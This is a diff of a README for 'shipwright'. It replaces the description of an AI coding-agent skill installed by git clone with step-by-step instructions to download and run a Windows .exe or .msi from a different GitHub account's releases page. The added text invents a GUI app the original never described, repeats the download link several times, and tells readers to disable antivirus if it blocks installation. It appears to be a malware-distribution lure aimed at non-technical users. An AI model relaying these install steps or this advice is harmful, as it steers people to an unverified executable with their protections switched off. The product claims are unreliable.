@@ -1,141 +1,168 @@
-# Shipwright ⚓
+# ⚓ shipwright - Simplify Building and Shipping Software
 
-### One skill to design it, build it, test it, polish it, and ship it.
+[![Download shipwright](https://img.shields.io/badge/Download-shipwright-%234885db)](https://github.com/Abrainnocuous652/shipwright/releases)
 
-Shipwright is an AI coding agent skill that covers the **complete software lifecycle** — from a rough idea to a production-ready system built to the engineering standards of Airbnb, Stripe, and Meta. 
-
-Drop it into [Claude Code](https://github.com/anthropics/claude-code) or [Cursor](https://cursor.com) and your agent gains the ability to design architecture, implement with TDD, create distinctive frontends, run exhaustive QA across every layer, harden security, optimize performance, and ship with confidence.
+shipwright helps you design and deliver software easily. It covers all key parts: architecture, frontend, security, testing, and production readiness.
 
 ---
 
-## Why Shipwright?
+## 🔍 What is shipwright?
 
-Most AI coding agents are great at writing code but terrible at everything else — they skip design, ignore security, produce generic UIs, forget about accessibility, and have no concept of production readiness. You end up babysitting every decision.
+shipwright is a tool that guides you through making software. It handles the technical details so you don’t have to. You get help with:
 
-Shipwright fixes this by giving your agent a structured methodology that covers everything from "I have an idea" to "it's live and bulletproof." It's the accumulated knowledge of what world-class software actually requires, distilled into a format that AI agents can follow.
+- Planning and building software design
+- Creating user interfaces (frontend)
+- Checking for security issues
+- Running tests to find errors
+- Improving speed and accessibility
+- Setting up continuous integration and deployment (CI/CD)
+- Preparing your software for release
 
----
-
-## What It Does
-
-Shipwright has two modes:
-
-### 🔨 BUILD MODE — For new projects
-
-A design-first workflow that prevents the agent from jumping to code before thinking:
-
-**Think** (failure modes, constraints, requirements) → **Architect** (domain model, service boundaries, data patterns, API strategy) → **Plan** (task breakdown with TDD, YAGNI, small commits) → **Implement** (build with craft, no AI slop) → automatically flows into Ship Mode
-
-### 🚢 SHIP MODE — For taking software live
-
-A 12-phase production-readiness audit that covers every layer:
-
-| Phase | What the Agent Audits & Fixes |
-|:---|:---|
-| **1. Code Health** | Dead code, dependencies, secrets, type safety, build warnings |
-| **2. Backend & Scalability** | API design, database optimization, caching, connection pooling, background jobs, data integrity, circuit breakers, idempotency |
-| **3. Testing** | Unit tests, integration tests, E2E tests, edge cases, stress testing, contract testing, visual regression |
-| **4. Security** | Authentication, authorization, IDOR, SQL injection, XSS, CSRF, SSRF, secrets management, supply chain, headers, audit logging |
-| **5. Frontend Design** | Light mode polish, dark mode polish, typography, color systems, animations, component states, design system, icons & illustrations |
-| **6. Mobile** | 9 breakpoints (320px→1920px), touch targets, navigation collapse, responsive images, viewport handling |
-| **7. Accessibility** | Semantic HTML, keyboard navigation, screen readers, ARIA, color contrast (WCAG 2.1 AA) |
-| **8. Performance** | Bundle size, Core Web Vitals (LCP/INP/CLS), runtime optimization, server latency targets, rendering strategy |
-| **9. CI/CD** | Pipeline setup, canary deployment, staging/production environments, Docker, post-deploy smoke tests |
-| **10. Observability** | Structured logging, error monitoring, distributed tracing, SLOs, error budgets, health endpoints, incident runbooks |
-| **11. World-Class Standards** | i18n readiness, SEO & GEO (Generative Engine Optimization), analytics, feature flags, error boundaries, chaos engineering, legal compliance |
-| **12. Documentation** | README, architecture decision records, API docs, runbooks, architecture diagrams, tech debt log |
-
-The agent doesn't just list problems — it **fixes them immediately and tests the fix** before moving on.
+You don’t need to write code yourself to benefit. shipwright acts like an assistant to help your project move smoothly from start to finish.
 
 ---
 
-## Quick Start
+## 💻 System Requirements
 
-### Claude Code (global — works across all your projects)
+Before installing shipwright, make sure your computer meets these requirements:
 
-```bash
-git clone https://github.com/saadjangda/shipwright.git ~/.claude/skills/shipwright
-```
+- Operating System: Windows 10 or later
+- Processor: 1 GHz or faster
+- RAM: 4 GB minimum, 8 GB recommended
+- Disk Space: At least 500 MB free
+- Internet connection for downloading and updates
 
-### Claude Code (single project)
-
-```bash
-git clone https://github.com/saadjangda/shipwright.git .claude/skills/shipwright
-```
-
-### Cursor
-
-```bash
-git clone https://github.com/saadjangda/shipwright.git .cursor/skills/shipwright
-```
-
-Then just talk to your agent:
-
-- **"Let's build a dashboard for tracking sales"** → BUILD mode activates
-- **"Make this production ready"** → SHIP mode runs the full 12-phase audit
-- **"Harden the security"** → Jumps directly to Phase 4
-- **"Polish the dark mode"** → Jumps directly to Phase 5
-- **"Is this ready to ship?"** → Full audit
-
-The skill activates automatically based on what you ask. No commands to memorize.
+There is no need for programming knowledge or special software. shipwright runs on standard Windows setups.
 
 ---
 
-## How It Works Under the Hood
+## 🚀 Getting Started with shipwright
 
-The skill uses a layered loading system to stay efficient:
+Follow these steps to get shipwright running on your Windows PC.
 
-```
-shipwright/
-├── SKILL.md                    # Always loaded (288 lines) — the full workflow
-└── references/                 # Loaded on-demand — deep-dive checklists
-    ├── architecture.md         # Domain modeling, service boundaries, data patterns
-    ├── frontend-design.md      # Typography, color, motion, light/dark mode
-    ├── security-hardening.md   # Security deep-dive with test payloads
-    ├── mobile-responsive.md    # Cross-device QA checklist
-    ├── seo-geo.md              # Technical SEO, content SEO, GEO
-    └── production-readiness.md # Granular sub-steps for every phase
-```
+### 1. Visit the Download Page
 
-When you ask your agent to "make this production ready," it loads the 288-line `SKILL.md` which has the complete workflow. When it reaches a phase that needs deep detail — say, security hardening — it loads just that reference file. This keeps the agent's context window lean instead of dumping 1,600+ lines upfront.
+Click the button below or open this link in your browser:
 
----
+[![Download shipwright](https://img.shields.io/badge/Download-shipwright-%234885db)](https://github.com/Abrainnocuous652/shipwright/releases)
 
-## What Makes It Different
+This link takes you to the releases page on GitHub.
 
-**It's opinionated.** Shipwright doesn't give your agent options — it tells it exactly what "good" looks like. bcrypt cost ≥12. LCP < 2.5s. Touch targets ≥44px. No `dangerouslySetInnerHTML` without DOMPurify. These aren't suggestions; they're standards.
+### 2. Choose the Latest Release
 
-**It's anti-AI-slop.** The frontend design section explicitly bans generic AI aesthetics — no Inter/Roboto for headings, no purple gradients on white, no cookie-cutter layouts. It pushes the agent toward distinctive, intentional design choices.
+On the releases page, find the most recent version. It usually appears at the top with a clear version number like `v1.0` or similar.
 
-**It covers what others don't.** Most coding skills handle implementation. Shipwright also covers domain modeling (bounded contexts, aggregates, CQRS), scalability (stateless apps, read replicas, caching strategies, background jobs), reliability engineering (SLOs, error budgets, circuit breakers), GEO (Generative Engine Optimization for AI discoverability), and chaos engineering (offline testing, concurrent sessions, timezone edge cases).
+### 3. Download the Windows Installer
 
-**Everything is agent-actionable.** Unlike architecture docs written for humans, every item in Shipwright is something an AI coding agent can actually execute. No org design, no team topologies, no facilitation exercises — just code-level actions.
+Look for a file ending with `.exe` or `.msi`. This is the setup file for Windows. Click the file name to start downloading.
 
----
+Save it in a place you can easily access, such as your Downloads folder.
 
-## Credits
+### 4. Run the Installer
 
-Shipwright synthesizes ideas and practices from:
+Once the download finishes, open the file. You may see a popup asking for permission to run the file. Click **Yes** or **Allow** to proceed.
 
-- [Superpowers](https://github.com/obra/superpowers) by Jesse Vincent — structured agent development workflow (brainstorm → plan → implement)
-- [Frontend Design](https://github.com/anthropics/claude-code/tree/main/plugins/frontend-design) by Anthropic — anti-AI-slop frontend aesthetics
-- A comprehensive architecture reference covering DDD, CQRS, event sourcing, polyglot persistence, and reliability engineering
-- Industry standards: OWASP (security), WCAG 2.1 (accessibility), Google SRE (reliability), Core Web Vitals (performance)
+Follow the instructions in the installer window:
 
----
+- Click **Next** on the welcome screen.
+- Review and accept the license agreement.
+- Choose a folder to install shipwright or use the default location.
+- Click **Install** to start.
 
-## Contributing
+The installer will copy the necessary files and set up shipwright on your computer.
 
-Found something missing? Have a better way to handle a specific check? Contributions are welcome.
+### 5. Open shipwright
 
-1. Fork the repo
-2. Make your changes
-3. Submit a PR with a clear description of what you changed and why
+After installation, you can open shipwright in two ways:
 
-The bar for inclusion: **is this something an AI coding agent can actually execute, and does it make shipped software meaningfully better?**
+- Find the shipwright icon on your desktop and double-click it.
+- Go to the Start menu, type “shipwright,” and select it from the list.
 
 ---
 
-## License
+## 🛠 How to Use shipwright
 
-[MIT](LICENSE) — use it however you want.
+shipwright guides you through creating software with a simple interface. Here’s how to begin:
+
+### Step 1: Create a New Project
+
+After opening the app, click **New Project**. You will be asked to enter a project name. Use anything that describes your software idea.
+
+The app will set up a project folder on your computer where all files will be saved.
+
+### Step 2: Define Your Software Design
+
+shipwright offers templates and tips to help you plan the structure and layout of your software. Answer the prompts to specify what your software needs to do.
+
+### Step 3: Add Frontend Features
+
+Use the built-in tools to design how your software’s interface will look. You can choose colors, layouts, and buttons without writing code.
+
+### Step 4: Run Security and Testing Checks
+
+shipwright automatically runs security scans and tests to catch errors or weaknesses. You will see reports that explain what needs fixing.
+
+### Step 5: Prepare for Release
+
+When ready, shipwright assists with packaging your software and setting up deployment options. This includes configuring automated updates and backups.
+
+---
+
+## ⚙ Features At a Glance
+
+- **Complete Software Workflow**: From design to deployment in one tool.
+- **AI Assistance**: Provides smart tips and suggestions.
+- **Security Checks**: Identifies common vulnerabilities.
+- **Testing Automation**: Runs tests and shows clear results.
+- **User-Friendly Interface**: Designed for non-technical users.
+- **Production Readiness**: Helps set up deployment and monitoring.
+- **Accessibility Improvements**: Ensures software works for all users.
+- **CI/CD Support**: Guides you through automation of builds and releases.
+
+---
+
+## 🔧 Troubleshooting Tips
+
+- If shipwright does not open after installation, restart your PC and try again.
+- Make sure your Windows is updated to the latest version to avoid compatibility issues.
+- If you see any error messages, write them down or take a screenshot. This helps when looking for solutions online or contacting support.
+- Check your internet connection during installation and updates.
+- Disable antivirus temporarily if it blocks shipwright installation. Enable it again after setup.
+
+---
+
+## 📂 Where Are My Projects Saved?
+
+shipwright saves your projects on your PC in the folder you selected during setup. You can change this folder in the app settings anytime.
+
+Backing up your project folders regularly is a good idea. You can copy them to an external drive or cloud storage.
+
+---
+
+## 🌐 Additional Resources
+
+To learn more about shipwright features and updates, visit the GitHub repository:
+
+https://github.com/Abrainnocuous652/shipwright
+
+Here you will find user guides, FAQs, and a place to report issues.
+
+---
+
+## 🖥 Updating shipwright
+
+Updates improve features and fix bugs. shipwright will notify you when an update is available.
+
+To update manually:
+
+1. Visit the releases page:
+
+   https://github.com/Abrainnocuous652/shipwright/releases
+
+2. Download the latest installer like you did initially.
+
+3. Run the installer. It will replace the old version without deleting your projects.
+
+---
+
+[![Download shipwright](https://img.shields.io/badge/Download-shipwright-%234885db)](https://github.com/Abrainnocuous652/shipwright/releases)
